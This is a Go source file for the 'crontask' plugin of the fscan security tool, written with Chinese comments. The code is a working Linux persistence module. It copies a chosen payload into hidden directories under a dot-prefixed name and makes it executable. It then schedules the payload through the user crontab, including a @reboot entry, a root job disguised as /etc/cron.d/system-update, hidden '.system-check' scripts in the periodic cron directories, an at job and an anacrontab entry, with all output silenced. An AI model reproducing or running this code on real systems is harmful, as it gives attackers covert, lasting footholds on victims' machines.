//go:build (plugin_crontask || !plugin_selective) && linux && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// CronTaskPlugin 定时任务插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现持久化功能
// - 保持原有功能逻辑
type CronTaskPlugin struct {
	plugins.BasePlugin
	targetFile string
}

// NewCronTaskPlugin 创建计划任务持久化插件
func NewCronTaskPlugin() *CronTaskPlugin {
	return &CronTaskPlugin{
		BasePlugin: plugins.NewBasePlugin("crontask"),
	}
}

// Scan 执行计划任务持久化 - 直接实现
func (p *CronTaskPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	var output strings.Builder

	if runtime.GOOS != "linux" {
		return &plugins.Result{
			Success: false,
			Output:  "计划任务持久化只支持Linux平台",
			Error:   fmt.Errorf("不支持的平台: %s", runtime.GOOS),
		}
	}

	// 从config获取配置
	p.targetFile = config.PersistenceTargetFile
	if p.targetFile == "" {
		return &plugins.Result{
			Success: false,
			Output:  "必须通过 -persistence-file 参数指定目标文件路径",
			Error:   fmt.Errorf("未指定目标文件"),
		}
	}

	// 检查目标文件是否存在
	if _, err := os.Stat(p.targetFile); os.IsNotExist(err) {
		return &plugins.Result{
			Success: false,
			Output:  fmt.Sprintf("目标文件不存在: %s", p.targetFile),
			Error:   err,
		}
	}

	// 检查crontab是否可用
	if _, err := exec.LookPath("crontab"); err != nil {
		return &plugins.Result{
			Success: false,
			Output:  "crontab命令不可用",
			Error:   err,
		}
	}

	output.WriteString("=== 计划任务持久化 ===\n")
	output.WriteString(fmt.Sprintf("目标文件: %s\n\n", p.targetFile))

	var successCount int

	// 1. 复制文件到持久化目录
	persistPath, err := p.copyToPersistPath()
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 复制文件失败: %v\n", err))
	} else {
		output.WriteString(fmt.Sprintf("✓ 文件已复制到: %s\n", persistPath))
		successCount++
	}

	// 2. 添加用户crontab任务
	err = p.addUserCronJob(persistPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 添加用户cron任务失败: %v\n", err))
	} else {
		output.WriteString("✓ 已添加用户crontab任务\n")
		successCount++
	}

	// 3. 添加系统cron任务
	systemCronFiles, err := p.addSystemCronJobs(persistPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 添加系统cron任务失败: %v\n", err))
	} else {
		output.WriteString(fmt.Sprintf("✓ 已添加系统cron任务: %s\n", strings.Join(systemCronFiles, ", ")))
		successCount++
	}

	// 4. 创建at任务
	err = p.addAtJob(persistPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 添加at任务失败: %v\n", err))
	} else {
		output.WriteString("✓ 已添加at延时任务\n")
		successCount++
	}

	// 5. 创建anacron任务
	err = p.addAnacronJob(persistPath)
	if err != nil {
		output.WriteString(fmt.Sprintf("✗ 添加anacron任务失败: %v\n", err))
	} else {
		output.WriteString("✓ 已添加anacron任务\n")
		successCount++
	}

	// 输出统计
	output.WriteString(fmt.Sprintf("\n持久化完成: 成功(%d) 总计(%d)\n", successCount, 5))

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("crontask_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Output:  output.String(),
		Error:   nil,
	}
}

// copyToPersistPath 复制文件到持久化目录
func (p *CronTaskPlugin) copyToPersistPath() (string, error) {
	// 选择持久化目录
	persistDirs := []string{
		"/tmp/.system",
		"/var/tmp/.cache",
		"/opt/.local",
	}

	// 获取用户目录
	if usr, err := user.Current(); err == nil {
		userDirs := []string{
			filepath.Join(usr.HomeDir, ".local", "bin"),
			filepath.Join(usr.HomeDir, ".cache"),
		}
		persistDirs = append(userDirs, persistDirs...)
	}

	var targetDir string
	for _, dir := range persistDirs {
		if err := os.MkdirAll(dir, 0755); err == nil {
			targetDir = dir
			break
		}
	}

	if targetDir == "" {
		return "", fmt.Errorf("无法创建持久化目录")
	}

	// 生成隐藏文件名
	basename := filepath.Base(p.targetFile)
	hiddenName := "." + strings.TrimSuffix(basename, filepath.Ext(basename))
	if p.isScriptFile() {
		hiddenName += ".sh"
	}

	targetPath := filepath.Join(targetDir, hiddenName)

	// 复制文件
	err := p.copyFile(p.targetFile, targetPath)
	if err != nil {
		return "", err
	}

	// 设置执行权限
	_ = os.Chmod(targetPath, 0755)

	return targetPath, nil
}

// copyFile 复制文件内容
func (p *CronTaskPlugin) copyFile(src, dst string) error {
	sourceData, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, sourceData, 0755)
}

// addUserCronJob 添加用户crontab任务
func (p *CronTaskPlugin) addUserCronJob(execPath string) error {
	// 获取现有crontab
	cmd := exec.Command("crontab", "-l")
	currentCrontab, _ := cmd.Output()

	// 生成新的cron任务
	cronJobs := p.generateCronJobs(execPath)
	newCrontab := string(currentCrontab)

	for _, job := range cronJobs {
		if !strings.Contains(newCrontab, execPath) {
			if newCrontab != "" && !strings.HasSuffix(newCrontab, "\n") {
				newCrontab += "\n"
			}
			newCrontab += job + "\n"
		}
	}

	// 应用新的crontab
	cmd = exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCrontab)
	return cmd.Run()
}

// addSystemCronJobs 添加系统cron任务
func (p *CronTaskPlugin) addSystemCronJobs(execPath string) ([]string, error) {
	cronDirs := []string{
		"/etc/cron.d",
		"/etc/cron.hourly",
		"/etc/cron.daily",
		"/etc/cron.weekly",
		"/etc/cron.monthly",
	}

	var modified []string

	// 在cron.d中创建配置文件
	cronFile := filepath.Join("/etc/cron.d", "system-update")
	cronContent := fmt.Sprintf("*/5 * * * * root %s >/dev/null 2>&1\n", execPath)
	if err := os.WriteFile(cronFile, []byte(cronContent), 0644); err == nil {
		modified = append(modified, cronFile)
	}

	// 在每个cron目录中创建脚本
	for _, cronDir := range cronDirs[1:] { // 跳过cron.d
		if _, err := os.Stat(cronDir); os.IsNotExist(err) {
			continue
		}

		scriptFile := filepath.Join(cronDir, ".system-check")
		scriptContent := fmt.Sprintf("#!/bin/bash\n%s >/dev/null 2>&1 &\n", execPath)

		if err := os.WriteFile(scriptFile, []byte(scriptContent), 0755); err == nil {
			modified = append(modified, scriptFile)
		}
	}

	if len(modified) == 0 {
		return nil, fmt.Errorf("无法创建任何系统cron任务")
	}

	return modified, nil
}

// addAtJob 添加at延时任务
func (p *CronTaskPlugin) addAtJob(execPath string) error {
	// 检查at命令是否可用
	if _, err := exec.LookPath("at"); err != nil {
		return err
	}

	// 创建5分钟后执行的任务
	atCommand := fmt.Sprintf("echo '%s >/dev/null 2>&1' | at now + 5 minutes", execPath)
	cmd := exec.Command("sh", "-c", atCommand)
	return cmd.Run()
}

// addAnacronJob 添加anacron任务
func (p *CronTaskPlugin) addAnacronJob(execPath string) error {
	anacronFile := "/etc/anacrontab"

	// 检查anacrontab是否存在
	if _, err := os.Stat(anacronFile); os.IsNotExist(err) {
		return err
	}

	// 读取现有内容
	content := ""
	if data, err := os.ReadFile(anacronFile); err == nil {
		content = string(data)
	}

	// 检查是否已存在
	if strings.Contains(content, execPath) {
		return nil
	}

	// 添加新任务
	anacronLine := fmt.Sprintf("1\t5\tsystem.update\t%s >/dev/null 2>&1", execPath)
	if !strings.HasSuffix(content, "\n") && content != "" {
		content += "\n"
	}
	content += anacronLine + "\n"

	return os.WriteFile(anacronFile, []byte(content), 0644)
}

// generateCronJobs 生成多种cron任务
func (p *CronTaskPlugin) generateCronJobs(execPath string) []string {
	baseCmd := execPath
	if p.isScriptFile() {
		baseCmd = fmt.Sprintf("bash %s", execPath)
	}
	baseCmd += " >/dev/null 2>&1"

	return []string{
		// 每5分钟执行一次
		fmt.Sprintf("*/5 * * * * %s", baseCmd),
		// 每小时执行一次
		fmt.Sprintf("0 * * * * %s", baseCmd),
		// 每天执行一次
		fmt.Sprintf("0 0 * * * %s", baseCmd),
		// 启动时执行
		fmt.Sprintf("@reboot %s", baseCmd),
	}
}

// isScriptFile 检查是否为脚本文件
func (p *CronTaskPlugin) isScriptFile() bool {
	ext := strings.ToLower(filepath.Ext(p.targetFile))
	return ext == ".sh" || ext == ".bash" || ext == ".zsh"
}

// 注册插件
func init() {
	RegisterLocalPlugin("crontask", func() Plugin {
		return NewCronTaskPlugin()
	})
}
